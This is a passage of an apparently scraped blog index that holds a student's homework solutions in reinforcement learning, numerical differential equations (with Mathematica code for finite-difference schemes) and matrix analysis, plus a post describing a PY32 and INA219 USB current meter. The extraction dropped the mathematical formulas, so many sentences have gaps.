那样用现在的信息来更改一个现在没有直接关联的值，但也要求在求梯度的过程中，导致现在的优势函数归因到过去的动作（策略）上，这个“归因到过去”的语义是类似的。 Problem 3 如果这里的 LM 算法是指 Levenberg-Marquardt 算法，那么这个算法是用来求解非线性最小二乘问题的。这个方法是通过将 Gauss-Newton 方法和梯度下降方法结合起来，通过引入一个参数 来控制两种方法的比例。LM 方法通过求解下面的问题来获得更新步长 其中 是 的雅可比矩阵。上式相当于在牛顿法的基础上加入了阻尼项 , 对上式求偏导数并令其为零，可以得到 解得步长为 注意到 时，上式就是 Gauss-Newton 方法的更新步长。当 较大时，更新步长接近于梯度下降的更新步长。因此 LM 算法可以看作是 Gauss-Newton 方法和梯度下降方法的折中，可以看作是一种类似于信赖域思想的改进。在本节介绍的 Advanced PG 方法中，可以类比于 TRPO 对 KL 散度的约束，LM 算法对梯度的约束，通过引入 来控制梯度的大小，从而保证梯度的更新不会太大，保证了更新的稳定性。TRPO 方法则约束每步更新 的 KL 散度，保证了策略更新的稳定性，也通过泰勒展开来求解更新步长。 Problem 4 从定义上看，Value-based RL 指的是通过学习值函数，学习每个状态的价值，再通过贪心方法得到贪心策略的方法，策略作为贪心的 argmax 的结果是具有确定性的。而 Policy-based RL 则跳过了学习值函数这一步，直接学习策略，因此有可能表示一个非确定性的策略。 在使用显式的表格法的时候，两种模式是容易区分的；而在使用隐式的函数近似的时候，这两种方法的区别就不明显了。如果使用隐式的方法来表示状态、动作的价值（比如 DDPG 试图解决的连续动作的情况），这个时候从状态价值贪心地得到策略就不是那么容易了，导出的策略也可以是非确定性的，于是就模糊了 Value-based 和 Policy-based 的边界。另一方面，存在一些方法，比如 AlphaZero 能同时学习策略和价值。AlphaZero 的神经网络同时给出了状态下价值和策略的估计，策略用于拓展搜索树，估计的价值用于 Backup 从而改善后续的搜索策略。这种方法可以看作是 Value-based 和 Policy-based 的结合，也是一种混合方法。于是，Value-based 和 Policy-based RL 并不是对立的，而是一种方法的不同侧重点，实际中的方法可能会同时使用两种方法的优点。","tags":["强化学习"],"categories":["课程"]},{"title":"基于 PY32 和 INA219 的 USB3.0 电流表","path":"/2024/5/1/PY32-Current-Meter/","content":"1. 项目简介 PY32F002A 是一款极具性价比的 32 位 MCU, 部分封装仅售 0.3 元起, 适合用于各种低成本的嵌入式应用. 本项目基于 PY32F002A 和 INA219 电流传感器, 实现了一个 USB3.0 电流表, 可以测量 USB3.0 设备的电流, 电压和功率. 2. 功能特性 量程：3.3V ~ 20V, 0 ~ 5A 在屏幕上显示电流，电压和功率 可通过串口输出数据 提供 Type-A 和 Type-C 两种版本 已接通所有 USB3.0 高速信号线，支持高速传输和快充协议（实测能达到 340 MB/s 传输速度并驱动 4k 60Hz 显示器） 3. 硬件设计 主要使用的芯片如下： PY32F002A: 32 位 MCU, 20KB Flash, 4KB RAM, 24MHz 主频 INA219: 12 位 ADC, 电流传感器, I2C 接口 LGS5148: 宽电压输入，可调输出的 Buck 降压芯片 XC6206: 200mA 低压差稳压器 SSD1306: 128x32 OLED 显示屏 Type-A 接口使用沉板封装 Type-C 接口使用 0.8mm 板厚的夹板封装 4. 注意事项 考虑到高速信号的阻抗匹配，两种版本均使用四层板。 Type-A 版本使用 1.6mm 板厚，JLC04161H-3313 阻抗 Type-C 版本使用 0.8mm 板厚，JLC04081H-3313 阻抗 (0.8mm 板厚可用沉金免费券) R1 为 INA219 的采样电阻，建议使用 2mΩ 电阻减少压降，也可使用 10mΩ 电阻或者更大的。使用其他阻值需要修改程序中的电流计算公式。 可以买一个 5W 的 USB 电阻负载来校准读数，修改 main.c 中 CURRENT_CALIBRATION 的值。 立创 EDA 导出的 BOM 是正确的。 串口和 SWD 调试接口已经引出，可以使用兼容 DAPLink 的调试器进行下载和调试。 Type-C 版本从母口供电时，示数会包括电流表自身的电流，可自行修改程序减掉这部分电流。 5. 实物图片 6. 相关链接 嘉立创开源广场（原理图、PCB、BOM 和 hex 固件） https://oshwhub.com/duanyll/simple-current-meterhttps://oshwhub.com/duanyll/simple-current-meter 代码仓库 https://github.com/Duanyll/py32-ina219-usb-meterhttps://github.com/Duanyll/py32-ina219-usb-meter","tags":["电子设计","嘉立创eda","py32"],"categories":["技术"]},{"title":"微分方程数值解作业 4","path":"/2024/4/29/DE-4/","content":"Problem 1 Numerical domain of dependence for each method The CFL condition require that the numerical domain of dependence should contain the physical domain of dependence, which is . Therefore, for these methods, Can be used. Satifies the CFL condition when Cannot be used. It never satisfies the CFL condition. Can be used. Satifies the CFL condition when Cannot be used. It never satisfies the CFL condition. Problem 2 Question (a) 12345678910111213141516171819\\begin{tikzpicture}\\draw[gray, thick] (-3,0) -- (2,0);\\draw[gray, thick] (-3,-1) -- (2,-1);\\draw[gray, thick] (-2,-1.5) -- (-2,0.5);\\draw[gray, thick] (-1,-1.5) -- (-1,0.5);\\draw[gray, thick] (0,-1.5) -- (0,0.5);\\draw[gray, thick] (1,-1.5) -- (1,0.5);\\draw (-3.5,0) node {$t_{j+1}$};\\draw (-3.5,-1) node {$t_{j}$};\\draw (-2,-2) node {$x_{i-2}$};\\draw (-1,-2) node {$x_{i-1}$};\\draw (0,-2) node {$x_i$};\\draw (1,-2) node {$x_{i+1}$};\\draw[red] (0,0) circle [radius=0.15];\\filldraw[red] (-2,-1) circle [radius=0.15];\\filldraw[red] (-1,-1) circle [radius=0.15];\\filldraw[red] (0,-1) circle [radius=0.15];\\filldraw[red] (1,-1) circle [radius=0.15];\\end{tikzpicture} Question (b) The numerical domain of dependence for the Fromm method is The CFL condition requires that the numerical domain of dependence should contain the physical domain of dependence, which is a single point . To satisfy the CFL condition, we need that is To discuss the stability of the Fromm method, we use the assumption Substitute this into the Fromm method, we have Divide by , we have The amplification factor is To be stable, we need , that is . Therefore, we have Therefore, Finally we have that the Fromm method is stable when . To discuss the monotonicity of the Fromm method, it can be noticed that the four coefficients of the Fromm method can never be all positive at the same . That is, the Fromm method is not monotonic. Question (c) The Fromm method Determine the truncation error by using Taylor expansion ( subscripts are omitted for simplicity) Notice that Therefore, we have Problem 3 Question (a) Use the Taylor expansion Question (b) The differential equation to solve is On grid points , where , we use forward difference for and central difference for , Extract from the equation, we have Substitute with formula in Question (a), and use to denote , we have Question (c) To discuss the stability, use the assumption Substitute this into FDE, we have The amplification factor is To be stable, we need , that is Therefore, That is, the stable condition is . Problem 4 1234567891011121314151617181920212223makeTridiagonal[n_, {a_, b_, c_}] := DiagonalMatrix[ConstantArray[c, n - 1], -1] + DiagonalMatrix[ConstantArray[b, n]] + DiagonalMatrix[ConstantArray[a, n - 1], 1];upwind[n_, \\[Lambda]_] := makeTridiagonal[n, {0, 1 - \\[Lambda], \\[Lambda]}];laxFriedrichs[n_, \\[Lambda]_] := Module[{mat}, mat = makeTridiagonal[ n, {1/2 (1 - \\[Lambda]), 0, 1/2 (1 + \\[Lambda])}]; mat[[n, n - 1]] = \\[Lambda]; mat[[n, n]] = 1 - \\[Lambda]; Return[mat]; ];laxWendroff[n_, \\[Lambda]_] := Module[{mat}, mat = makeTridiagonal[ n, {-\\[Lambda]/2 (1 - \\[Lambda]), 1 - \\[Lambda]^2, \\[Lambda]/2 (1 + \\[Lambda])}]; mat[[n, n - 1]] = \\[Lambda]; mat[[n, n]] = 1 - \\[Lambda]; Return[mat]; ]; 1234567891011121314151617advectionSolve[a_, g_, n_, l_, r_, m_, td_, method_] := Module[{x, t, k, h, \\[Lambda], mat, u}, h = (r - l)/(n + 1); x = Range[l + h, r - h, h]; k = td/m; t = Range[0, td, k]; \\[Lambda] = (a k)/h; mat = method[n, \\[Lambda]]; u = ConstantArray[0, {n, m + 1}]; u[[All, 1]] = g /@ x; Do[u[[All, j]] = mat . u[[All, j - 1]], {j, 2, m + 1}]; Return[ Interpolation[ Join[Flatten[MapThread[List, {Outer[List, x, t], u}, 2], 1], Map[{{l, #}, 0} &amp;, t], Map[{{r, #}, 0} &amp;, t]], InterpolationOrder -&gt; 1]]; ]; Test the code with the following example 12345678a = 1;g = Function[x, If[0 &lt;= x &lt;= 1, 1., 0.]];l = -10;r = 10;td = 7;sol = advectionSolve[a, g, 201, l, r, 72, td, laxFriedrichs];Manipulate[ Plot[sol[x, t], {x, -10, 10}, PlotRange -&gt; {-1, 2}], {t, 0, 7}] 123456789101112131415161718exact = DSolveValue[{D[u[x, t], x] + D[u[x, t], t] == 0, u[x, 0] == If[0 &lt;= x &lt;= 1, 1, 0]}, u[x, t], {x, t}];makeFigure411[a_, g_, n_, l_, r_, ms_, td_, method_, exact_] := GraphicsColumn[Function[m, Module[{xs, sol}, xs = Subdivide[l, r, n + 1]; sol = advectionSolve[a, g, n, l, r, m, td, method]; ListLinePlot[{sol[#, td] &amp; /@ xs, exact /. {x -&gt; #, t -&gt; td} &amp; /@ xs}, PlotRange -&gt; {-1, 1.2}, DataRange -&gt; {l, r}, PlotLegends -&gt; Placed[{StringForm[\"M = ``\", m], \"Exact\"}, {0.2, 0.1}], PlotStyle -&gt; {Thick, Directive[Black, Dashed]}, AxesLabel -&gt; {\"x\", \"solution\"}, AspectRatio -&gt; 1/3, ImageSize -&gt; Medium ] ]] /@ ms, ImageSize -&gt; Large]; 12makeFigure411[a, g, 201, l, r, {70, 72}, td, #, exact] &amp; /@ {upwind, laxWendroff, laxFriedrichs} Solution at t=7 for upwind method Solution at t=7 for Lax-Wendroff method Solution at t=7 for Lax-Friedrichs method For all cases, we have That indicates all these methods are unstable. As a result, it can be observed that all three solutions oscillate at the discontinuity. When , we have That indicates all these methods are stable. It can be seen that the oscillation no longer exists in the solution. Among these three methods, Lax-Wendroff method is not monotonic, while the other two methods are monotonic. This is reflected in the solution, where the Lax-Wendroff method has overshoots at the discontinuity, while other two methods do not.","tags":["微分方程"],"categories":["课程"]},{"title":"微分方程数值解作业 3","path":"/2024/4/18/DE-3/","content":"Problem 1 Question (a) Assume (3.30) and substitute it into (3.51) With setting , we have Collecting terms with and on each side, we have Use the identity , we have Then use , we can get Finally, we have which contains the desired . Question (b) The stability condition is Breakdown the absolute value, we have Since , the right inequality is always true. For the left inequality, we have which holds irrespective of the value of under the condition Problem 2 Question (a) The stencil is shown below. 123456789101112131415161718\\begin{tikzpicture}\\draw[gray, thick] (-2,1) -- (2,1);\\draw[gray, thick] (-2,0) -- (2,0);\\draw[gray, thick] (-2,-1) -- (2,-1);\\draw[gray, thick] (-1,-1.5) -- (-1,1.5);\\draw[gray, thick] (0,-1.5) -- (0,1.5);\\draw[gray, thick] (1,-1.5) -- (1,1.5);\\draw (-2.5,1) node {$t_{j+1}$};\\draw (-2.5,0) node {$t_j$};\\draw (-2.5,-1) node {$t_{j-1}$};\\draw (-1,-2) node {$x_{i-1}$};\\draw (0,-2) node {$x_i$};\\draw (1,-2) node {$x_{i+1}$};\\draw[red] (0,1) circle [radius=0.15];\\filldraw[red] (1,0) circle [radius=0.15];\\filldraw[red] (0,-1) circle [radius=0.15];\\filldraw[red] (-1,0) circle [radius=0.15];\\end{tikzpicture} Limits on and are Question (b) FDE for the Dufort-Frankel scheme is Extract and use Taylor expansion ( subscript is omitted), we have Use and drop higher order terms, we have This is of order . Due to the presence of term, the method is not consistent when , where when . Therefore the method is only conditionally consistent. Question (c) The method is explicit. can be directly calculated from , and without solving a linear system or inverse function. Question (d) Use notation, the FDE can be written as Extract , we have Substitute with the generic solution , we have Assume , and divide both sides by , we have which yields the following 2nd order equation The roots of this equation are For the method to be stable, we need . For real roots where , we have For complex roots where , we have and Note that guarantees that , and the method is unconditionally stable. Question (e) From , we have This indicates that though deacys exponentially, it does so slowly when is large. Therefore, the method is stable but not L-stable. Problem 3 Question (a) From equation (3.22) we can replace terms with Taylor expansion at , and obtain Cancel duplicated terms, we have where has an order of . Note that the fifth spatial derivative terms in also cancel out, so the remain in is instead of . Question (b) (c) Taking , we have When applied to the heat equation we have assuming is smooth enough, we have Therefore, we can see that the terms in cancel out, and the error is reduced to . Question (d) Apply Taylor expansion to , we have omitted. Cancel out terms to get And extract It is possible but tedious to show that in can be finally reduced to in . is at least of order. In heat equation, we have , which indicates that when , the two terms in cancel out, and the error is reduced to . Question (e) In the above sub-figure, is fixed for each curve and is varing along the horizontal axis. This does not match situation in the question. This sub-figure has fixed for each curve, and is decreasing along the horizontal axis. For a given , curve has larger and smaller . It can be observed that curve has larger error than curve at the same , indicating that decreasing while keeping increases the error. From this perspective, there is no contradiction. Problem 4 Question (a) 123456789101112131415161718192021222324252627282930313233makeAMatrix[n_, \\[Lambda]_] := DiagonalMatrix[ConstantArray[1 - 2 \\[Lambda], n]] + DiagonalMatrix[ConstantArray[\\[Lambda], n - 1], 1] + DiagonalMatrix[ConstantArray[\\[Lambda], n - 1], -1];makeBMatrix[n_, \\[Lambda]_] := DiagonalMatrix[ConstantArray[1 + 2 \\[Lambda], n]] + DiagonalMatrix[ConstantArray[-\\[Lambda], n - 1], 1] + DiagonalMatrix[ConstantArray[-\\[Lambda], n - 1], -1];explicitIt[u1_, f1_, f2_, k_, a_, b_] := a . u1 - k f1;implicitIt[u1_, f1_, f2_, k_, a_, b_] := Inverse[b] . (u1 - k f2);crankNicolsonIt[u1_, f1_, f2_, k_, a_, b_] := Inverse[b + IdentityMatrix[Length[b]]] . (a . u1 + u1 - k (f1 + f2));heatSolve[f_, g_, n_, m_, td_, it_] := Module[{x, t, h, k, \\[Lambda], a, b, fval, u}, h = 1/(n + 1); x = Range[h, 1 - h, h]; k = td/m; t = Range[0, td, k]; \\[Lambda] = k/h^2; a = makeAMatrix[n, \\[Lambda]]; b = makeBMatrix[n, \\[Lambda]]; fval = Outer[f, x, t]; u = ConstantArray[0, {n, m + 1}]; u[[All, 1]] = g /@ x; Do[u[[All, j]] = it[u[[All, j - 1]], fval[[All, j - 1]], fval[[All, j]], k, a, b], {j, 2, m + 1}]; Return[ Interpolation[ Join[Flatten[MapThread[List, {Outer[List, x, t], u}, 2], 1], Map[{{0, #}, 0} &amp;, t], Map[{{1, #}, 0} &amp;, t]]] ]; ]; Check the code with the following test case 1234567f = Function[{x, t}, 0];g = Function[{x}, N[Sin[2 \\[Pi] x]]];n = 20;m = 5;td = 0.1;sol = heatSolve[f, g, n, m, td, explicitIt];Plot3D[sol[x, t], {x, 0.`, 1.`}, {t, 0.`, 0.1`}, PlotRange -&gt; Full] Find the analytical solution 1234exactsol = DSolveValue[{D[u[x, t], t] == D[u[x, t], {x, 2}], u[x, 0] == Sin[2 \\[Pi] x]}, u[x, t], {x, t}]Plot3D[exactsol, {x, 0.`, 1.`}, {t, 0.`, 0.1`}, PlotRange -&gt; Full] Then define functions to make error plot 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768makeFigure315[f_, g_, n_, ms_, td_, tp_, it_, exact_] := Module[{sols}, sols = Map[heatSolve[f, g, n, #, td, it] &amp;, ms]; Return[GraphicsColumn[Map[Function[{ts}, Show[ ListLinePlot[ Map[Function[{sol}, sol[#, ts] &amp; /@ Subdivide[n + 1]], sols], PlotMarkers -&gt; Automatic, DataRange -&gt; {0, 1}, PlotLegends -&gt; (StringForm[\"M = ``\", #] &amp;) /@ ms], Plot[exact /. t -&gt; ts, {x, 0, 1}, PlotStyle -&gt; Gray, PlotLegends -&gt; {\"Analytical\"}], PlotRange -&gt; Full, AspectRatio -&gt; 1/2, ImageSize -&gt; Medium, PlotLabel -&gt; StringForm[\"Time = ``\", ts], AxesLabel -&gt; {\"x-axis\", \"solution\"} ]], tp], ImageSize -&gt; Large]]; ];makeFigure316FixedN[f_, g_, ns_, mpoints_, mmax_, td_, it_, exact_] := ListLogLogPlot[Function[n, Module[{ms, xs, errs}, ms = Round[Exp[Subdivide[Log[5], Log[mmax], mpoints]]]; xs = Subdivide[n + 1]; errs = Function[m, Max[Abs[(heatSolve[f, g, n, m, td, it][#, td] &amp; /@ xs) - (exact /. {t -&gt; td, x -&gt; xs})]]] /@ ms; Return[Transpose[{ms, errs}]]; ]] /@ ns, PlotMarkers -&gt; Automatic, Joined -&gt; True, PlotLegends -&gt; (StringForm[\"N = ``\", #] &amp;) /@ ns, PlotRange -&gt; Full, AspectRatio -&gt; 1/2, ImageSize -&gt; Medium, AxesLabel -&gt; {\"M\", \"Error\"} ];makeFigure316FixedLambda[f_, g_, \\[Lambda]s_, mpoints_, mmax_, td_, it_, exact_] := ListLogLogPlot[Function[\\[Lambda], Module[{ms, ns, xs, errs}, ms = Round[Exp[Subdivide[Log[16 td/\\[Lambda]], Log[mmax], mpoints]]]; ns = Round[Sqrt[(\\[Lambda] ms)/td] - 1]; xs = Subdivide[n + 1]; errs = MapThread[ Function[{n, m}, Max[Abs[(heatSolve[f, g, n, m, td, it][#, td] &amp; /@ xs) - (exact /. {t -&gt; td, x -&gt; xs})]]], {ns, ms}]; Return[Transpose[{ms, errs}]]; ]] /@ \\[Lambda]s, PlotMarkers -&gt; Automatic, Joined -&gt; True, PlotLegends -&gt; (StringForm[\"\\[Lambda] = ``\", #] &amp;) /@ \\[Lambda]s, PlotRange -&gt; Full, AspectRatio -&gt; 1/2, ImageSize -&gt; Medium, AxesLabel -&gt; {\"M\", \"Error\"} ];makeFigure316FixedKH[f_, g_, khs_, mpoints_, mmax_, td_, it_, exact_] := ListLogLogPlot[Function[kh, Module[{ms, ns, xs, errs}, ms = Round[Exp[Subdivide[Log[16 td/kh], Log[mmax], mpoints]]]; ns = Round[(kh ms)/td - 1]; xs = Subdivide[n + 1]; errs = MapThread[ Function[{n, m}, Max[Abs[(heatSolve[f, g, n, m, td, it][#, td] &amp; /@ xs) - (exact /. {t -&gt; td, x -&gt; xs})]]], {ns, ms}]; Return[Transpose[{ms, errs}]]; ]] /@ khs, PlotMarkers -&gt; Automatic, Joined -&gt; True, PlotLegends -&gt; (StringForm[\"k/h = ``\", #] &amp;) /@ khs, PlotRange -&gt; Full, AspectRatio -&gt; 1/2, ImageSize -&gt; Medium, AxesLabel -&gt; {\"M\", \"Error\"} ]; Explicit Method 1makeFigure315[f, g, 20, {5, 20}, 0.1, {0.02, 0.04, 0.1}, explicitIt, exactsol] Comparison between analytical solution and explicit method solution 1makeFigure316FixedN[f, g, {20, 40}, 10, 50, 0.1, explicitIt, exactsol] Error vs number of time points (M) for explicit method, fixing N 12makeFigure316FixedLambda[f, g, {0.490, 0.245, 0.1}, 5, 5000, 0.1, explicitIt, exactsol] Error vs number of time points (M) for explicit method, fixing Lambda Implicit Method 1makeFigure315[f, g, 20, {5, 20}, 0.1, {0.02, 0.04, 0.1}, implicitIt, exactsol] Comparison between analytical solution and implicit method solution 12makeFigure316FixedN[f, g, {20, 40}, 20, 5000, 0.1, implicitIt, exactsol] Error vs number of time points (M) for implicit method, fixing N 12makeFigure316FixedLambda[f, g, {0.490, 0.245, 0.1}, 5, 5000, 0.1, implicitIt, exactsol] Error vs number of time points (M) for implicit method, fixing Lambda Crank-Nicolson Method 1makeFigure315[f, g, 20, {5, 20}, 0.1, {0.02, 0.04, 0.1}, crankNicolsonIt, exactsol] Comparison between analytical solution and Crank-Nicolson method solution 12makeFigure316FixedN[f, g, {20, 40}, 20, 500, 0.1, crankNicolsonIt, exactsol] Error vs number of time points (M) for implCrank-Nicolson method, fixing N 12makeFigure316FixedKH[f, g, {0.4, 0.04}, 5, 200, 0.1, crankNicolsonIt, exactsol] Error vs number of time points (M) for implCrank-Nicolson method, fixing k/h Question (b) First find the analytical solution 1234exactsol = DSolveValue[{D[u[x, t], t] == D[u[x, t], {x, 2}], u[x, 0] == UnitBox[2 x - 1], u[0, t] == 0, u[1, t] == 0}, u[x, t], {x, t}] Calculating the infinite sum is not feasible, we simply limit the sum to . 1234567exactfun = Function[{nx, nt}, Apply[NSum, exactsol /. {t -&gt; nt, x -&gt; nx, K[1] -&gt; i, DirectedInfinity[1] -&gt; 20}]];Plot3D[exactfun[x, t], {x, 0.`, 1.`}, {t, 0.`, 0.1`}, PlotRange -&gt; Full] Loss in high frequency is observed where is small, but this should be fine. 1234567891011121314makeFigure317[f_, g_, n_, ms_, td_, tp_, it_, exact_] := Module[{sols}, sols = Map[heatSolve[f, g, n, #, td, it] &amp;, ms]; Return[GraphicsColumn[Map[Function[{ts}, Show[ ListLinePlot[ Map[Function[{sol}, sol[#, ts] &amp; /@ Subdivide[n + 1]], sols], PlotMarkers -&gt; {Automatic, Tiny}, DataRange -&gt; {0, 1}, PlotLegends -&gt; (StringForm[\"M = ``\", #] &amp;) /@ ms], Plot[exact[x, ts], {x, 0, 1}, PlotStyle -&gt; Gray, PlotLegends -&gt; {\"Analytical\"}], PlotRange -&gt; Full, AspectRatio -&gt; 1/2, ImageSize -&gt; Medium, PlotLabel -&gt; StringForm[\"Time = ``\", ts], AxesLabel -&gt; {\"x-axis\", \"solution\"} ]], tp], ImageSize -&gt; Large]]; ]; Implicit Method 12makeFigure317[f, g, 30, {20, 80, 160}, 0.1, {0.02, 0.04, 0.1}, implicitIt, exactfun] Crank-Nicolson Method 12makeFigure317[f, g, 30, {20, 80, 160}, 0.1, {0.02, 0.04, 0.1}, crankNicolsonIt, exactfun] For Crank-Nicolson method, the amplification factor is Though , we still have bounded. Therefore the jumps in the solution are not amplified to infinity and finally decays when goes large.","tags":["微分方程"],"categories":["课程"]},{"title":"强化学习作业 6","path":"/2024/4/15/RL-6/","content":"Problem 1 - 线性 VFA 与 Q-Learning Problem 2 - 线性 VFA 与 Bellman 算子","tags":["强化学习"],"categories":["课程"]},{"title":"强化学习作业 5","path":"/2024/4/14/RL-5/","content":"Problem 1 - 动作价值的学习与 Off-Policy Question 1 Question 2 对于 对于 对于 Question 3 对于 对于 对于 Question 4 Question 5 因为状态价值直接与策略有关。在 Bellman 方程中，状态价值需要用策略对下一步的状态价值加权求和， 与 的分布有关，若 的分布不同于 的分布，则需要用 IS 矫正才能得到正确的 , 否则得到的其实是 . 而对于动作价值， 中 已经选定了, 的分布不影响 , 所以不需要使用 IS。 Problem 2 - Q-Learning 算法的收敛性","tags":["强化学习"],"categories":["课程"]},{"title":"矩阵分析作业 2","path":"/2024/4/7/Matrix-1/","content":"Problem 1 若 , 则 是否相同? 证明之. 不妨设 . 考虑 的 QR 分解形式 Q 是 方阵满足 , R 是 上三角矩阵. 则 而 由于 是上三角阵, 则能做有限次的初等列变换将 化为对角阵, 即存在可逆矩阵 使得 是对角阵. 于是 所以 . 同理可证 . 所以 . Problem 2 若 , 证明 和 的非零特征值相同. 的非零特征值 , 非零向量 使得 则 所以 也是 的非零特征值, 其特征向量为 . 同理可证 的非零特征值 , 也是 的非零特征值. 则 和 的非零特征值相同. Problem 3 123456789101112131415161718192021222324252627&gt;&gt; A = [2, 6; 2, 6.00001];&gt;&gt; B = [2, 6; 2, 8.00001];&gt;&gt; D = [0, 0; 0, -0.00002];&gt;&gt; inv(A)ans = 1.0e+05 * 3.0000 -3.0000 -1.0000 1.0000&gt;&gt; inv(A + D)ans = 1.0e+05 * -3.0000 3.0000 1.0000 -1.0000&gt;&gt; inv(B + D)ans = 2.0000 -1.5000 -0.5000 0.5000 注意到对 的小扰动造成了其逆的巨大变化, 而对 进行相同的扰动造成的逆的变化极小. Problem 4 1234567891011121314151617181920212223242526272829303132333435&gt;&gt; cond(A, 1)ans = 4.8000e+06&gt;&gt; cond(A, 2)ans = 4.0000e+06&gt;&gt; cond(A, Inf)ans = 4.8000e+06&gt;&gt; cond(B, 1)ans = 34.9999&gt;&gt; cond(B, 2)ans = 26.9628&gt;&gt; cond(B, Inf)ans = 34.9999 发现 的条件数远大于 的条件数，说明 的数值稳定性远不如 .","tags":["矩阵分析"],"categories":["课程"]},{"title":"微分方程数值解作业 2","path":"/2024/3/23/DE-2/","content":"Problem 1 To solve (2.4) We can always obtain the equation at non-boundary positions, The above FDE approximation has an error of Question (a) The first condition and in Eqn. becomes For the second condition substitute with an one-sided approximation we have And the final equation becomes The whole FDE system in matrix form Question (b) Therefore FDE system in matrix form Problem 2 Question (a) Use central difference to approximate with Substitute back Question (b) Given the differerntial equation Simply susbtitute with in the above equation, and discard the higher order terms, we have Question (c) When we will be able to seperate from , and the difference equation becomes Collect terms on the left hand side The above equation is linear, and could be written in matrix form. Denote Assume the boundary conditions are and , we can obtain Equation at and Finally, the FDE system is expressed in explicit matrix form Question (d) Therefore, when satisfies , Equation (2.4) will not contain term, and can be solve by the method in Question (b). That requires to be a constant. Problem 3 At , use a third-ordered forward difference to approximiate and And use a forth-ordered forward difference to approximiate Substitute back to the equation we have one equation with 5 variables to . At to , use a forth-ordered central difference to approximiate and and a forth-ordered central difference to approximiate substitute them back we have equations with variables from to . Also, the boundry conditions provide 3 equations Put Equations together, we could obtain a second-order non-linear FDE system with equations and variables to . Problem 4 Question (a) 1234eqn = \\[Epsilon] D[y[x], {x, 2}] - D[y[x], x] == -1 &amp;&amp; y[0] == 1 &amp;&amp; y[1] == 3;sol = (1 + # + (E^(#/\\[Epsilon]) - 1)/(E^(1/\\[Epsilon]) - 1)) &amp;;eqn /. {y -&gt; sol} 1True Question (b) Collect terms At boundries FDE system in matrix form Since we have used first-ordered backward difference to approximate , the truncation error is . Question (c) It is obvious that the matrix in Equation meets the second condition of Theorem 2.1, therefore the matrix is invertible. If we use Equation (2.16) to build the FDE system, Theorem 2.2 guarantees the existence of a unique solution if . That is, . Question (d) 12345678910111213141516tridiagonalSolve[b_, a_, c_, z_] := Module[{y, v, w, n}, n = Length[a]; w = a[[1]]; y = ConstantArray[0, n]; y[[1]] = z[[1]]/w; v = ConstantArray[0, n]; Do[ v[[i]] = c[[i - 1]]/w; w = a[[i]] - b[[i]] v[[i]]; y[[i]] = (z[[i]] - b[[i]] y[[i - 1]])/w; , {i, 2, n}]; Do[ y[[i]] = y[[i]] - v[[i + 1]] y[[i + 1]]; , {i, n - 1, 1, -1}]; Return[y]; ]; 12345678910111213141516171819202122232425262728solve1[\\[Epsilon]_, n_] := Module[{c, a, b, h, x, y, z}, h = 1/(n + 1); x = Range[h, 1 - h, h]; b = ConstantArray[h + \\[Epsilon], n]; a = ConstantArray[-(h + 2 \\[Epsilon]), n]; c = ConstantArray[\\[Epsilon], n]; z = ConstantArray[-h^2, n]; z[[1]] = -h^2 - h - \\[Epsilon]; z[[n]] = -h^2 - 3 \\[Epsilon]; y = tridiagonalSolve[b, a, c, z]; Return[ Interpolation[Join[{{0, 1}, {1, 3}}, Transpose[{x, y}]], InterpolationOrder -&gt; 1]]; ];solve2[\\[Epsilon]_, n_] := Module[{c, a, b, h, x, y, z}, h = 1/(n + 1); x = Range[h, 1 - h, h]; b = ConstantArray[\\[Epsilon] + h/2, n]; a = ConstantArray[-2 \\[Epsilon], n]; c = ConstantArray[\\[Epsilon] - h/2, n]; z = ConstantArray[-h^2, n]; z[[1]] = -h^2 - b[[1]]; z[[n]] = -h^2 - 3 c[[n]]; y = tridiagonalSolve[b, a, c, z]; Return[ Interpolation[Join[{{0, 1}, {1, 3}}, Transpose[{x, y}]], InterpolationOrder -&gt; 1]]; ]; 1234567891011solveAndPlot[eps_, n_] := Module[{s1, s2}, s1 = solve1[eps, n]; s2 = solve2[eps, n]; Plot[{symSol /. \\[Epsilon] -&gt; eps, s1[x], s2[x]}, {x, 0, 1}, PlotLegends -&gt; Placed[{\"Symbolic\", \"Method from (b)\", \"Equation (2.16)\"}, Right], PlotLabel -&gt; StringForm[\"Solution for \\[Epsilon]=``, N=``\", eps, n]] ];GraphicsColumn[{solveAndPlot[0.1, 10], solveAndPlot[0.1, 20], solveAndPlot[0.1, 40]}] Question (e) 12GraphicsColumn[{solveAndPlot[0.01, 10], solveAndPlot[0.01, 20], solveAndPlot[0.01, 40]}] Question (f) It can be observed that both methods are converging to the symbolic solution as increases. The method in (b) is less accurate than Equation (2.16) when is . However, when gets smaller, (b) is still stable but Equation (2.16) oscillates. When is even smaller, (2.16) oscillates more severely. The oscillation in (2.16) happens when is violated. Therefore, when is small, the method in (b) better than (2.16) since it converges regardless of and .","tags":["微分方程"],"categories":["课程"]},{"title":"强化学习作业 4","path":"/2024/3/20/RL-4/","content":"Problem 1 Method First-Visit MC Incremental First Visit MC TD(0) 2-Step TD graph LR; A---&gt;|a1,R=0|T; B---&gt;|a1,R=0|A; C---&gt;|a1,R=0|B; A---&gt;|a2,R=0|B; B---&gt;|a2,R=0|C; C---&gt;|a2,R=1|T; 注意到不同的方法的计算难度有很大的差别，计算出的价值函数也有很大的差别。在理论上上面的所有方法都能收敛到真实的价值函数，但是由于参与估计的样本量极少，而不同方法侧重于样本的不同方面，从而导致估计的结果不同。由于不知道真实的价值函数，也不知道具体的应用情形，很难说哪种方法的收敛速度会更快。能发现的是，在样本量小的情况下，由于 设置的很低，基于更新步长的方法明显更加迟钝，估计的价值函数偏小。 Problem 2 记发生 次 “左” 动作的轨迹出现的概率为 , 易知 样本值 期望","tags":["强化学习"],"categories":["课程"]},{"title":"强化学习作业 3","path":"/2024/3/17/RL-3/","content":"Problem 1 对应于从 S 出发的单源最短路问题。容易得到一种最优策略 最优策略不唯一。 Problem 2 构建 矩阵 12345n = 4;m = 4;id[i_, j_] := m (i - 1) + j;row[idx_] := Quotient[idx - 1, m] + 1;col[idx_] := Mod[idx - 1, m] + 1; 12345678910111213pfunc[a_, s_, t_] := Switch[a, 1, If[row[s, m] == 1, If[t == s, 1, 0], If[t == id[row[s] - 1, col[s]], 1, 0]], 2, If[row[s, m] == n, If[t == s, 1, 0], If[t == id[row[s] + 1, col[s]], 1, 0]], 3, If[col[s, m] == 1, If[t == s, 1, 0], If[t == id[row[s], col[s] - 1], 1, 0]], 4, If[col[s, m] == m, If[t == s, 1, 0], If[t == id[row[s], col[s] + 1], 1, 0]] ];rfunc [a_, s_] := If[pfunc[a, s, 1] == 1, 0, -1];r = Table[rfunc[a, s], {a, 4}, {s, n m}];p = 